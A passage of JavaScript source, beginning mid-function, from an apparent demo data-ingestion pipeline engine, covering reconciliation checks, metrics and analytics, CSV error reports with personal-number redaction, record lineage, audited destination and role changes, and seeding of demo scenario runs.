          if (!run.dryRun && (cl === 'ACCEPTED') && state.master.byKey.has(r.idemKey)) destinationCount++;
        }
      }
      const n = (k) => (ids[k] || []).length;
      const s = {
        received: n('received'), rejectedBeforeDelivery: n('rejectedBeforeDelivery'), invalid: n('invalid'), duplicates: n('duplicates'),
        heldForReview: n('heldForReview'), notProcessed: n('notProcessed'), accepted: n('accepted'),
        primaryWritten: n('primaryWritten'), primaryFailed: n('primaryFailed'), awaitingRetry: n('awaitingRetry'), unknown: n('unknown'), inFlight: n('inFlight'),
        replicaConfirmed: n('replicaConfirmed'), replicaPending: n('replicaPending'), replicaFailed: n('replicaFailed'), duplicatesPrevented: n('duplicatesPrevented'),
        destinationCount, ids,
      };
      s.checks = [
        { name: 'Received = rejected before delivery + held for review + accepted', lhs: s.received, rhs: s.rejectedBeforeDelivery + s.heldForReview + s.accepted + s.notProcessed, ok: s.received === s.rejectedBeforeDelivery + s.heldForReview + s.accepted + s.notProcessed },
        { name: 'Accepted = SR1 written + SR1 failed + awaiting retry + unknown + in flight', lhs: s.accepted, rhs: s.primaryWritten + s.primaryFailed + s.awaitingRetry + s.unknown + s.inFlight, ok: s.accepted === s.primaryWritten + s.primaryFailed + s.awaitingRetry + s.unknown + s.inFlight },
        { name: 'SR1 written = SR2 confirmed + SR2 pending + SR2 failed', lhs: s.primaryWritten, rhs: s.replicaConfirmed + s.replicaPending + s.replicaFailed, ok: s.primaryWritten === s.replicaConfirmed + s.replicaPending + s.replicaFailed },
        { name: 'SR1 acknowledged (middleware) = records held by SR1 for these runs', lhs: s.primaryWritten, rhs: destinationCount, ok: s.primaryWritten === destinationCount },
      ];
      s.destinationMismatch = s.primaryWritten !== destinationCount;
      s.outstanding = s.awaitingRetry + s.unknown + s.inFlight + s.replicaPending + s.replicaFailed + s.heldForReview;
      s.balanced = s.checks.every((c) => c.ok) && s.outstanding === 0;
      return s;
    }

    function filterRuns(f) {
      f = f || {};
      const startToday = new Date(state.now); startToday.setHours(0, 0, 0, 0);
      const since = f.range === 'today' ? startToday.getTime() : f.range === '7d' ? state.now - 7 * DAY : f.range === '24h' ? state.now - DAY : 0;
      return state.runs.filter((r) => r.createdAt >= since && (!f.sourceId || r.sourceId === f.sourceId) && (!f.mode || r.mode === f.mode) && (!f.status || runStatus(r) === f.status));
    }

    function metrics(f) {
      const runs = filterRuns(f);
      const recs = runs.flatMap((r) => r.records);
      const rc = reconcileSummary(runs);
      const startToday = new Date(state.now); startToday.setHours(0, 0, 0, 0);
      const pendingLag = recs.filter((r) => r.primary.status === 'WRITTEN' && r.replica.status === 'PENDING').map((r) => state.now - r.primary.writtenAt);
      const lastConfirmed = recs.filter((r) => r.replica.status === 'CONFIRMED').sort((a, b) => b.replica.confirmedAt - a.replica.confirmedAt)[0];
      const live = state.sources.filter((s) => !s.removed);
      return {
        sourcesTotal: live.length, sourcesActive: live.filter((s) => s.enabled).length, sourcesDisabled: live.filter((s) => !s.enabled).length,
        runsToday: state.runs.filter((r) => r.createdAt >= startToday.getTime()).length,
        runs: runs.length, runsFailed: runs.filter((r) => ['FAILED', 'BLOCKED'].includes(runStatus(r))).length,
        fetched: rc.received, validated: recs.filter((r) => r.validation.status === 'VALID').length,
        validationFailures: rc.invalid, duplicates: rc.duplicates, heldForReview: rc.heldForReview,
        accepted: rc.accepted, deliveredSR1: rc.primaryWritten, confirmedSR2: rc.replicaConfirmed,
        deliveryFailures: rc.primaryFailed, awaitingRetry: rc.awaitingRetry, unknown: rc.unknown,
        replicaPending: rc.replicaPending, replicaFailed: rc.replicaFailed, duplicatesPrevented: rc.duplicatesPrevented,
        replicationLagMs: pendingLag.length ? Math.max(...pendingLag) : lastConfirmed ? lastConfirmed.replica.lagMs : 0,
        replicationLagIsLive: pendingLag.length > 0,
        successRate: rc.accepted ? rc.primaryWritten / rc.accepted : null,
        endToEndRate: rc.received ? rc.replicaConfirmed / rc.received : null,
        openErrors: state.errors.filter((e) => e.resolution === 'OPEN' || e.resolution === 'RETRYING').length,
        blockedAttempts: state.blockedAttempts.length,
        reconciliation: rc,
      };
    }

    function analytics(f) {
      const runs = filterRuns(f);
      const days = [];
      const span = f && f.range === 'today' ? 1 : 7;
      for (let i = span - 1; i >= 0; i--) days.push(dayKey(state.now - i * DAY));
      const byDay = Object.fromEntries(days.map((d) => [d, { day: d, received: 0, written: 0, rejected: 0, failed: 0, outstanding: 0, retries: 0 }]));
      const bySource = {}, byMode = { API: { accepted: 0, written: 0, received: 0, valid: 0 }, IMPORT: { accepted: 0, written: 0, received: 0, valid: 0 } };
      const issueCats = {}, outcomes = { WRITTEN: 0, AWAITING_RETRY: 0, UNKNOWN: 0, DEAD_LETTER: 0, IN_FLIGHT: 0 };
      const throughput = [], lag = [], errorTrend = {};
      for (const run of runs) {
        const d = byDay[dayKey(run.createdAt)];
        const src = (bySource[run.sourceId] = bySource[run.sourceId] || { sourceId: run.sourceId, name: run.sourceName, received: 0, valid: 0, written: 0, rejected: 0, failed: 0 });
        const mo = byMode[run.mode];
        for (const r of run.records) {
          const cl = classify(r);
          src.received++; mo.received++;
          if (r.validation.status === 'VALID') { src.valid++; mo.valid++; }
          if (d) d.received++;
          if (cl !== 'ACCEPTED') { src.rejected++; if (d) d.rejected++; }
          else {
            mo.accepted++;
            const ps = r.primary.status;
            if (ps === 'WRITTEN') { src.written++; mo.written++; if (d) d.written++; outcomes.WRITTEN++; }
            else if (ps === 'DEAD_LETTER' || ps === 'REJECTED') { src.failed++; if (d) d.failed++; outcomes.DEAD_LETTER++; }
            else { if (d) d.outstanding++; outcomes[ps === 'AWAITING_RETRY' ? 'AWAITING_RETRY' : ps === 'UNKNOWN' ? 'UNKNOWN' : 'IN_FLIGHT']++; }
          }
          r.primary.attempts.forEach((a) => { if (a.n > 1 || a.by !== 'pipeline') { const dd = byDay[dayKey(a.at)]; if (dd) dd.retries++; } });
          r.validation.issues.filter((i) => i.severity === 'ERROR').forEach((i) => { issueCats[i.code] = (issueCats[i.code] || 0) + 1; });
          if (r.dedup.status === 'DUPLICATE_IN_BATCH') issueCats.DUPLICATE_RECORD = (issueCats.DUPLICATE_RECORD || 0) + 1;
          if (r.dedup.status === 'MATCH_REVIEW' || r.dedup.reviewDecision) issueCats.MATCH_REQUIRES_REVIEW = (issueCats.MATCH_REQUIRES_REVIEW || 0) + 1;
          if (r.replica.status === 'CONFIRMED') lag.push({ at: r.replica.confirmedAt, lagMs: r.replica.lagMs, runId: run.id });
        }
        if (run.endedAt && run.records.length) throughput.push({ runId: run.id, mode: run.mode, at: run.createdAt, perMin: Math.round(run.records.length / Math.max((run.endedAt - run.startedAt) / 60000, 0.05)) });
      }
      for (const e of state.errors) {
        if (!runs.some((r) => r.id === e.runId) && !(e.code === 'SOURCE_DISABLED')) continue;
        const k = dayKey(e.at);
        if (!byDay[k]) continue;
        const sid = e.sourceId || 'unknown';
        errorTrend[sid] = errorTrend[sid] || Object.fromEntries(days.map((x) => [x, 0]));
        errorTrend[sid][k]++;
      }
      const lagByRun = {};
      lag.forEach((l) => { const x = (lagByRun[l.runId] = lagByRun[l.runId] || { runId: l.runId, at: l.at, max: 0, sum: 0, n: 0 }); x.max = Math.max(x.max, l.lagMs); x.sum += l.lagMs; x.n++; x.at = Math.max(x.at, l.at); });
      return {
        days, byDay: days.map((d) => byDay[d]), bySource: Object.values(bySource), byMode, issueCats, outcomes, throughput,
        lagByRun: Object.values(lagByRun).sort((a, b) => a.at - b.at).map((x) => ({ runId: x.runId, at: x.at, maxS: x.max / 1000, avgS: x.sum / x.n / 1000 })),
        errorTrend,
      };
    }

    function runReport(runId) {
      authz('report.download', runId);
      const run = getRun(runId);
      const rows = [['run_id', 'record_id', 'source_record_id', 'batch_id', 'stage', 'error_code', 'field', 'message', 'retryable', 'retry_count', 'primary_status', 'replica_status', 'trace_id', 'resolution']];
      for (const e of state.errors.filter((x) => x.runId === runId)) {
        const r = e.recordId ? findRecord(e.recordId) : null;
        rows.push([run.id, e.recordId || '', r ? r.sourceRecordId : '', r ? r.batchId || '' : '', e.stage, e.code, e.field || '', redact(e.detail), e.retryable, e.retryCount, r ? r.primary.status : '', r ? r.replica.status : '', e.traceId, e.resolution]);
      }
      audit('REPORT_DOWNLOADED', runId, 'SUCCESS', `${rows.length - 1} rows; personal data redacted`);
      return { name: `${run.id}_errors.csv`, text: toCsv(rows) };
    }
    // Error messages are built from field names, never values; this is a second line of defence.
    const redact = (s) => String(s || '').replace(/\b\d{10,11}\b/g, '[REDACTED]').replace(/\+?234\d{10}/g, '[REDACTED]');

    function lineage(recordId) {
      const r = findRecord(recordId);
      if (!r) return null;
      const run = getRun(r.runId);
      const s = getSource(r.sourceId);
      return {
        record: r, run, source: s,
        provenance: {
          internal_record_id: r.primary.masterId, source_registry_id: s.id, source_record_id: r.sourceRecordId, source_record_version: r.sourceVersion,
          ingestion_run_id: run.id, batch_id: r.batchId, source_extracted_at: r.times.extractedAt, source_updated_at: r.sourceUpdatedAt,
          ingested_at: r.times.mappedAt, destination_written_at: r.primary.writtenAt, destination_record_id: r.primary.masterId, ingest_id: r.primary.ingestId,
          source_endpoint_or_batch: run.mode === 'API' ? `${s.baseUrl}${s.endpoint}` : `${run.file.safeName} (sha256 ${run.file.checksum.slice(0, 16)}…)`,
          mapping_version: run.mappingVersion, transformation_version: run.transformVersion, idempotency_key: r.idemKey,
          validation_outcome: r.validation.status, dedup_outcome: r.dedup.status, primary_delivery: r.primary.status, replica_sync: r.replica.status,
          trace_id: r.traceId, audit_event_ids: run.auditIds.join(', '), error_ids: r.errorIds.join(', ') || '—',
        },
      };
    }

    function updateDestination(id, patch) {
      authz('destination.edit', id);
      const d = state.destinations.find((x) => x.id === id);
      if (!d) throw new Error('Unknown destination');
      Object.assign(d, patch);
      if ('enabled' in patch) d.health = patch.enabled ? 'HEALTHY' : 'DISABLED';
      audit('DESTINATION_UPDATED', id, 'SUCCESS', Object.keys(patch).join(', '));
      return d;
    }

    function setRole(role) {
      if (!ROLES[role]) throw new Error('Unknown role');
      audit('ROLE_SWITCHED', role, 'SUCCESS', `Demo role switch ${ROLES[state.role].label} → ${ROLES[role].label}`);
      state.role = role;
    }

    return {
      state, schema, can, setRole, getSource, getRun, findRecord, runStatus, classify,
      addSource, updateSource, updateDestination, setSourceEnabled, removeSource, sourceDependencies, testConnection, checkOutboundUrl,
      sourceFieldsFor, validateMapping, publishMapping, testMapping, applyMapping, validateCanonical,
      validateUpload, checkHeaders, sampleFile, parseCsv,
      startRun, stepRun, runToCompletion, dryRun, advanceClock, retryRecords, reconcileRun, resolveReview, resolveError,
      viewRawPayload, metrics, analytics, reconcileSummary, filterRuns, runReport, lineage, backoffMs, countPrimary,
    };
  }

  // Seeds a week of history by actually executing scenarios through the engine,
  // so every KPI and chart is derived from processed records, never hard-coded.
  function seedDemo(engine) {
    const st = engine.state;
    const real = st.now;
    const H = 3600000, MIN = 60000;
    // [offset before "now", scenario, let the retry scheduler / replica monitor settle afterwards]
    const plan = [
      [6 * DAY + 5 * H, 'S01', true], [6 * DAY + 3 * H, 'S02', true], [5 * DAY + 6 * H, 'S03', true], [5 * DAY + 2 * H, 'S01', true],
      [4 * DAY + 5 * H, 'S04', true], [4 * DAY + 3 * H, 'S10', true], [3 * DAY + 5 * H, 'S07', true], [3 * DAY + 2 * H, 'S02', true],
      [2 * DAY + 6 * H, 'S11', true], [2 * DAY + 3 * H, 'S09', true], [1 * DAY + 7 * H, 'S08', true], [1 * DAY + 5 * H, 'S14', true],
      [1 * DAY + 3 * H, 'S06', true], [4 * H, 'S15', true], [90 * MIN, 'S12', true], [20 * MIN, 'S10', false], [40000, 'S13', false],
    ];
    st.now = real - plan[0][0];
    for (const [offset, sid, settle] of plan) {
      st.now = Math.max(st.now, real - offset);
      const sc = SCENARIOS.find((x) => x.id === sid);
      const opts = { mode: sc.mode, scenarioId: sid, sim: { ...(sc.sim || {}) } };
      if (sc.file) opts.file = engine.sampleFile(sc.file, sc.source);
      const run = engine.startRun(sc.source, opts);
      if (run.blocked) continue;
      engine.runToCompletion(run);
      if (settle) engine.advanceClock(90000);
    }
    // Leaves live work for the demo: S12 unknown outcomes, S10 retries due, S13 replica lag,
    // S11/S15 dead letters, S14 replica failures, S07 match reviews.
    st.now = Math.max(st.now, real);
  }

  return { createEngine, seedDemo, SCENARIOS, ERROR_TAXONOMY, ROLES, PERMISSIONS, TRANSFORMS, sha256, parseCsv, csvCell, toCsv, mulberry32 };
});
